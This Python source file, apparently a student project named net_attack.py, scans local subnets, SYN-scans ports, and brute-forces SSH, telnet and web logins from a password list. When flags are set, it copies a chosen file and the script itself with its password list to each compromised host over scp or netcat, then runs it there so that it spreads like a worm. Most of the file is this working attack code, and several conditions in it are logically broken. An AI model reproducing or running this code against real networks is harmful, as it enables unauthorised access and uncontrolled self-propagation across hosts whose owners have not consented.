#!/usr/bin/python3
# TODO: Add param and return keywords to block comments with the necessary
#  contents to clarify what's being passed in and out. Maybe look at some
#  automatic documentation / keyword solutions? (Andrew)

# from scapy.all import *
# For use when adding new functionality with scapy, be sure to statically
# import when finished, wildcard is just for convenience.
from scapy.all import get_if_addr
from scapy.interfaces import get_if_list
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import sr
from scapy.utils import subprocess, os
from telnetlib import Telnet
from time import sleep
from paramiko import SSHClient, AutoAddPolicy, RejectPolicy
import logging
import requests
import strings

"""
 - Importing modules from scapy for Packet Crafting and Sending / Sniffing.
 - Importing telnetlib for telnet operations.
 - Importing sleep to allow network processes time to complete.
 - Importing from paramiko for ssh operations.
 - Importing logging to safely log sensitive, error or debug info.
 - Importing requests for web based operations.
 - Importing strings for use of the external strings resources.
"""

"""
===PLEASE READ===
Functions and methods are organised alphabetically with the exception of the
main method specified last. Every function has a block comment explaining what
it does.
"""


def additional_attacks(arguments, ip, port, username,
                       transfer_file_filename):
    """
    This function passes the appropriate arguments to and runs the transferring
    file and propagating functions, these functions contain the check to stop
    them from being run if the appropriate arguments aren't used.
    """
    try_transferring_file(arguments, ip, port, username,
                          transfer_file_filename)
    try_propagating(arguments, ip, port, username)


def append_lines_from_file_to_list(file):
    """
    This function will read a file and return the lines (minus the newline
    character) as a list.
    """
    lines_list = []
    for line in file:
        lines_list.append(line.rstrip())
    return lines_list


def assigning_values(arguments):
    """
    This function will read in the target ports, target username and passwords
    filename from the user and if the user specified an ip addresses file it
    will read that and return it alongside all the other values.
    """
    if "-t" in arguments:
        ip_addresses_filename = arguments[arguments.index("-t") + 1]
        try:
            ip_list = convert_file_to_list(ip_addresses_filename)
            target_ports = arguments[arguments.index("-p") + 1]
            target_username = arguments[arguments.index("-u") + 1]
            passwords_filename = arguments[arguments.index("-f") + 1]
            return ip_list, target_ports, target_username, passwords_filename
        except RuntimeError:
            logging.error(strings.ip_list_not_read(ip_addresses_filename))
            gtfo_and_rtfm()


def bruteforce_service(ip, port, username, password_list):
    """
    This function will run through every password in the password list and will
    attempt to bruteforce the appropriate service with that password. It will
    only move on to the next password in the event that the current password
    fails in its bruteforce attempt. If it succeeds then the successful login
    details are returned, if not then Null is returned.
    """
    for password in password_list:
        login_details = (try_password_for_service(ip, port, username,
                                                  password))
        if login_details != "":
            return login_details
    return None


def check_over_ssh(ip, port, username, password):
    """
    This function checks if the net_attack.py script is already located at the
    target machine over SSH. If it is then false is returned and if not then
    true is returned. This is needed as a prerequisite to propagating over SSH.
    """
    client = SSHClient()
    try:
        client.set_missing_host_key_policy(RejectPolicy)
        client.connect(hostname=str(ip), port=int(port),
                       username=str(username), password=str(password))
        client.exec_command("touch net_attack.py")
        if str(client.exec_command("cat net_attack.py")[1]).__len__() < 1:
            client.close()
            return True
        client.close()
        return False

    except RuntimeError:
        client.close()
        return True


def check_over_telnet(ip, port, username, password):
    """
    This function checks if the net_attack.py script is already located at the
    target machine over telnet. If it is then false is returned and if not then
    true is returned. This is needed as a prerequisite to propagating over
    telnet.
    """
    try:
        tel = Telnet(host=ip, port=port, timeout=2)
        tel.read_until("login:".encode("ascii"))
        tel.write((str(username) + "\n").encode("ascii"))
        tel.read_until("Password:".encode("ascii"))
        tel.write((str(password) + "\n").encode("ascii"))
        data = tel.read_until("Welcome to".encode("ascii"), timeout=4)
        if check_telnet_data("Welcome to", data):
            tel.write("cat net_attack.py\n".encode("ascii"))
            data = tel.read_until("main()".encode("ascii"), timeout=4)
            if data.__contains__("main()".encode("ascii")):
                return False
            return True
        return False

    except RuntimeError:
        return False


def check_telnet_data(string_to_check, data):
    """
    This function checks data gathered from the telnet service for a specific
    string and returns True if it finds it and false if it doesn't.
    """
    if data.__contains__(string_to_check.encode("ascii")):
        return True
    return False


def checking_arguments(arguments):
    """
    This function checks if the arguments are appropriately given and if
    they're not it calls the help function and kicks them out. There's also a
    check for the help argument itself. It'll try to assign the values if the
    proper arguments are given, and they're valid
    :param arguments: Arguments passed in by the user themselves
    :return values[0]: List of IP addresses
    :return values[1]: Ports and subsequently services to target
    :return values[2]: Username to target
    :return values[3]: Filename for a file containing passwords
    """
    if (("-t" or "-L" in arguments) and "-p" and "-u" and "-f" in arguments
            and len(arguments) >= 8 and "-h" and "--help" not in arguments):
        try:
            values = assigning_values(arguments)
            return values[0], values[1], values[2], values[3]

        except RuntimeError:
            logging.error("Failed assigning values (maybe null)")
            gtfo_and_rtfm()
    else:
        logging.error("Parameter misuse, check help text below")
        gtfo_and_rtfm()


def connect_ssh_client(ip, port, username, password):
    """
    This function checks to see if an SSH connection can be established and if
    so then it returns true, if not then it returns false.
    """
    client = SSHClient()
    try:
        client.set_missing_host_key_policy(RejectPolicy)
        client.connect(hostname=str(ip), port=int(port),
                       username=str(username), password=str(password))
        client.close()
        logging.info(strings.connection_status("SSH", ip, port, "Successful"))
        return True

    except RuntimeError:
        client.close()
        logging.debug(strings.connection_status("SSH", ip, port,
                                                "Unsuccessful"))
        return False


def connect_telnet(ip, port, username, password):
    """
    This function checks to see if a telnet connection can be established and
    if so then it returns true, if not then it returns false.
    """
    try:
        tel = Telnet(host=ip, port=port, timeout=2)
        tel.read_until("login:".encode("ascii"))
        tel.write((str(username) + "\n").encode("ascii"))
        tel.read_until("Password:".encode("ascii"))
        tel.write((str(password) + "\n").encode("ascii"))

        data = tel.read_until("Welcome to".encode("ascii"), timeout=4)
        logging.info(strings.connection_status("telnet", ip, port,
                                               "Successful"))
        if check_telnet_data("Welcome to", data):
            return True
        logging.debug(strings.connection_status("telnet", ip, port,
                                                "Unsuccessful"))
        return False

    except RuntimeError:
        logging.debug(strings.connection_status("telnet", ip, port,
                                                "Unsuccessful"))
        return False


def connect_web(ip, port, username, password):
    """
    This function check to see if a web login can be established and if so then
    it returns true, if not then it returns false.
    """
    attempt_succeeded = False
    try:
        send_post_request_with_login(ip, port, username, password)
        attempt_succeeded = True
    except RuntimeError:
        logging.debug(strings.connection_status("web", ip, port,
                                                "Unsuccessful"))
    if attempt_succeeded:
        logging.info(strings.connection_status("web", ip, port, "Successful"))
    return attempt_succeeded


def convert_file_to_list(filename):
    """
    This function will convert a given file specified by a filename to a list
    and will then proceed to return that list.
    """
    with open(str(filename)) as file:
        file_as_list = append_lines_from_file_to_list(file)
    return file_as_list


def cycle_through_subnet(ip_list, interface):
    """
    This function takes in a given network interface and an IP list, it will
    get the IP address of the interface and add all the address from its /24
    subnet to the IP list and will then return the list.
    """
    interface_split = get_if_addr(interface).split(".")
    last_byte = 0
    while last_byte < 256:
        specific_address = str(interface_split[0]) + "." \
                           + str(interface_split[1]) + "." \
                           + str(interface_split[2]) + "." \
                           + str(last_byte)
        if not ip_list.__contains__(specific_address):
            print("Adding " + str(specific_address) + " from interface "
                  + str(interface) + "'s subnet.")
            ip_list.append(specific_address)
        last_byte = last_byte + 1
    return ip_list


def file_error_handler():
    """
    This function handles errors related to the processing of files.
    """
    print(strings.FILENAME_PROCESSING_ERROR)
    gtfo_and_rtfm()


def file_not_exist(ip, port, username, password):
    """
    This function will check whether network_attack.py exists on a target
    machine and how it does that is dependent on the port being passed in.
    """
    if str(port) == "22":
        return check_over_ssh(ip, port, username, password)

    return check_over_telnet(ip, port, username, password)


def gathering_local_ips(ip_list):
    """
    This function will cycle through all local interfaces outside the loopback
    interface and will add their /24 subnets to the IP list.
    """
    print("Fetching local interface list...")
    local_interfaces = get_if_list()
    for interface in local_interfaces:
        if str(interface) != "lo":
            (print("Fetching IPs for interface " + str(interface) + "..."))
            ip_list.extend(cycle_through_subnet(ip_list, interface))
    return ip_list


def gtfo_and_rtfm():
    """
    This function will print the help screen and show an exit prompt.
    """
    print(strings.PLS_HELP)
    print(strings.EXITING)


def is_reachable_ip(ip):
    """
    This function checks to see if an IP is reachable and returns true if it is
    and false if it isn't. The commented out code is the scapy way of doing it
    and the uncommented code uses OS calls. In my testing OS calls were faster
    but both approaches work.
    """
    # ping_pkt = IP(dst=str(ip))/ICMP()
    # reply = sr(ping_pkt, timeout=1)[0]
    # if not reply:
    #     print(str(ip) + " was not reachable.")
    #     return False
    # print(ip + " was reachable.")
    # return True
    command = ["ping", "-c", "1", str(ip)]
    if subprocess.call(command) == 0:
        print(str(ip) + " was reachable.")
        return True
    print(str(ip) + " was not reachable.")
    return False


def propagate_script(ip, port, login_string):
    """
    This function is responsible for propagating the network_attack.py to a
    previously bruteforce machine. It will only run when the user specifies
    using the appropriate argument and when the port being bruteforce is
    either 22 (SSH) and 23 (telnet), it will also check to ensure the script
    isn't  already present on the target. It goes about propagating the script
    in different ways depending on if an SSH port or a telnet port is
    specified.
    """
    login_string_split = login_string.split(":")
    try:
        if file_not_exist(ip, port, login_string_split[0],
                          login_string_split[1]):
            if str(port) == "22":
                print("Please type in this password below and say yes to any"
                      + " RSA key prompts: ")
                os.system("scp -P " + str(port) + " net_attack.py "
                          + login_string_split[0] + "@" + ip + ":~/")
                print("Please type in this password again: ")
                os.system("scp -P " + str(port) + " passwords.txt "
                          + login_string_split[0] + "@" + ip + ":~/")
                client = SSHClient()
                try:
                    client.set_missing_host_key_policy(RejectPolicy)
                    client.connect(hostname=str(ip), port=int(port),
                                   username=str(login_string_split[0]),
                                   password=str(login_string_split[1]))
                    client.exec_command("net_attack.py -L -p 22,23 -u "
                                        + login_string_split[0] + " -f"
                                        + " passwords.txt -P")
                    client.close()
                    return True

                except RuntimeError:
                    client.close()
                    return False
            tel = Telnet(host=ip, port=port, timeout=2)
            tel.read_until("login:".encode("ascii"))
            tel.write((str(login_string_split[0]) + "\n").encode("ascii"))
            tel.read_until("Password:".encode("ascii"))
            tel.write((str(login_string_split[1]) + "\n").encode("ascii"))
            tel.write(("nc -l -p " + str(port)
                       + " > net_attack.py").encode("ascii"))
            os.system(("nc -w 3 " + str(ip) + " " + str(port)
                       + " < net_attack.py").encode("ascii"))
            tel.write(("nc -l -p " + str(port)
                       + " > passwords.txt").encode("ascii"))
            os.system(("nc -w 3 " + str(ip) + " " + str(port)
                       + " < passwords.txt").encode("ascii"))
            tel.write(("net_attack.py -L -p 22,23 -u " + login_string_split[0]
                       + " -f passwords.txt -P").encode("ascii"))
            return True
        else:
            print("net_attack.py is already on host: " + str(ip))
            return False
    except RuntimeError:
        return False


def remove_unreachable_ips(ip_list):
    """
    This function will try and ping every IP in the IP list and if it doesn't
    receive a response it will then remove that IP from the IP list.
    """
    new_ip_list = []
    for ip in ip_list:
        print("Checking if the following ip address is reachable: " + str(ip))
        if is_reachable_ip(ip):
            new_ip_list.append(ip)
    return new_ip_list


def scan_port(ip, port):
    """
    This function will scan a port to see if it is open. If the port is open
    then it will return true and if it is not then it will return false.
    """
    ip_header = IP(dst=ip)
    tcp_header = TCP(dport=int(port), flags="S")
    packet = ip_header / tcp_header
    response, unanswered = sr(packet, timeout=2)
    sleep(2)
    if len(response) > 0:
        return True
    return False


def send_post_request_with_login(ip, port, username, password):
    """
    This function sends a post request to a web server in an attempt to
    bruteforce its login details. If it succeeds with the given arguments then
    it will return the successful string of details, if not then it will return
    Null.
    """
    response = requests.post("https://" + ip + ":" + port + "/login.php",
                             data={"username": username, "password": password},
                             timeout=4)
    if response:
        logging.info(strings.connection_status("web", ip, port, "Successful"))
        return str(username) + ":" + str(password)
    else:
        logging.debug(strings.connection_status("web", ip, port,
                                                "Unsuccessful"))
        return None


def telnet_connection(ip_telnet, port_telnet, username_telnet,
                      password_telnet):
    """
    This function will try to establish a telnet connection, if it does it will
    return the successful telnet login string and if not then it will return a
    null value.
    """
    if connect_telnet(ip_telnet, port_telnet, username_telnet,
                      password_telnet):
        return str(username_telnet) + ":" + str(password_telnet)
    return None


def transfer_file(ip, port, login_string, transfer_file_filename):
    """
    This function will transfer a given file if the end user has provided the
    appropriate argument, and only when bruteforce login details are found for
    either tenet or SSH. It handles the transfer of this file differently
    depending on whether the port value given is an SSH port or a telnet port.
    """
    login_string_split = login_string.split(":")
    try:
        if str(port) == "22":
            print(
                "Please type in this password below and say yes to any RSA key"
                + " prompts: ")
            os.system("scp -P " + str(port) + " " + transfer_file_filename
                      + " " + login_string_split[0] + "@" + ip + ":~/")
            return True

        tel = Telnet(host=ip, port=port, timeout=2)
        tel.read_until("login:".encode("ascii"))
        tel.write((str(login_string_split[0]) + "\n").encode("ascii"))
        tel.read_until("Password:".encode("ascii"))
        tel.write((str(login_string_split[1]) + "\n").encode("ascii"))
        tel.write(("nc -l -p " + str(port) + " > "
                   + str(transfer_file_filename) + "\n").encode("ascii"))
        os.system(("nc -w 3 " + str(ip) + " " + str(port) + " < "
                   + str(transfer_file_filename) + "\n").encode("ascii"))
        return True
    except ConnectionRefusedError:
        return False


def try_attack(ip, port, target_username, password_list,
               transfer_file_filename, arguments):
    """
    This function will attempt a bruteforce attack across various services
    depending on the ip or port supplied (if the port is open on that IP), it
    iterates through the password list when you bruteforce the appropriate
    service associated with the port number supplied. If the bruteforce attack
    is successful it will then check the need for additional attacks specified
    by the end user.
    """
    logging.info("Now testing an IP address and port pair")
    if scan_port(ip, port):
        logging.info("Found an open IP address and port pair")
        bruteforce_login_details = try_bruteforce(ip, port, target_username,
                                                  password_list)
        if bruteforce_login_details[0]:
            additional_attacks(arguments, ip, port,
                               bruteforce_login_details[0],
                               transfer_file_filename)
    else:
        print("This IP address and port pair is closed.")


def try_bruteforce(ip, port, target_username, password_list):
    """
    This function will try to bruteforce a specific service depending on the
    port supplied. If it gets a successful login then it will return the login
    details and the service used, otherwise it returns null as the login
    details along with the service used.
    """
    service_switch = {
        "22": "ssh",
        "23": "telnet",
        "80": "web login",
        "8080": "web login",
        "8888": "web login"
    }
    service = service_switch.get(str(port))
    bruteforce = bruteforce_service(ip, port, target_username, password_list)
    if bruteforce:
        logging.info("A working username and password for " + str(service)
                     + " was found.")
        return str(bruteforce), service
    else:
        logging.debug("It was impossible to bruteforce this IP address and"
                      " port")
    return None, service


def try_password_for_service(ip, port, username, password):
    """
    This function tries to log into to a port's associated service using a
    specific username and password pair. If it succeeds it returns the
    successful login string, otherwise it returns an empty string.
    """
    try:
        connect_service_switch = {
            "22": lambda: connect_ssh_client(ip, port, username, password),
            "23": lambda: connect_telnet(ip, port, username, password),
            "80": lambda: connect_web(ip, port, username, password),
            "8080": lambda: connect_web(ip, port, username, password),
            "8888": lambda: connect_web(ip, port, username, password),
        }
        connect_service = connect_service_switch.get(str(port))
        if connect_service():
            return str(username) + ":" + str(password)
        return ""

    except RuntimeError:
        return ""


def try_propagating(arguments, ip, port, bruteforce):
    """
    This function attempts propagation of the network_attack.py script over
    the network. If it succeeds we alert the user and let them know what
    service was successful. If it is unsuccessful then we let the user know it
    was unsuccessful and over what service. Should the user have never asked
    for the script to be propagated over the network then we let them know this
    part of the process will not be done.
    """
    if "-P" in arguments and (port == "22" or "23"):
        propagated = propagate_script(ip, port, bruteforce)
        if propagated:
            logging.info("Script propagated over  this port")
        else:
            logging.debug("Script couldn't be propagated over this port")
    else:
        logging.info("Requirement to propagate script not specified,"
                     " skipping...")


def try_transferring_file(arguments, ip, port, bruteforce,
                          transfer_file_filename):
    """
    This function attempts transferring a user specified file across the
    network. If it succeeds we alert the user and let them know transferring
    the file was a success and over what service. If it is unsuccessful then we
    let the user know it was unsuccessful and over what service. Should the
    user have never asked for a file to be transferred over the network then we
    let them know this process will not be done.
    """
    if "-d" in arguments and (str(port) == "22" or "23"):
        transferred = transfer_file(ip, port, bruteforce,
                                    transfer_file_filename)
        if transferred:
            logging.info("File transferred over port 22 or 23")
        else:
            logging.debug("File couldn't be transferred over port 22 or 23")
    else:
        logging.info("Requirement to transfer file not specified, skipping...")


def validate_file_exists(filename):
    """
    This function checks if a file exists given a set filename and if it
    doesn't we alert the user with an error and put them in the bold corner.
    Just kidding we show the help screen and exit gracefully.
    """
    if not os.path.isfile(filename):
        logging.error("A specified file does not exist")
        gtfo_and_rtfm()
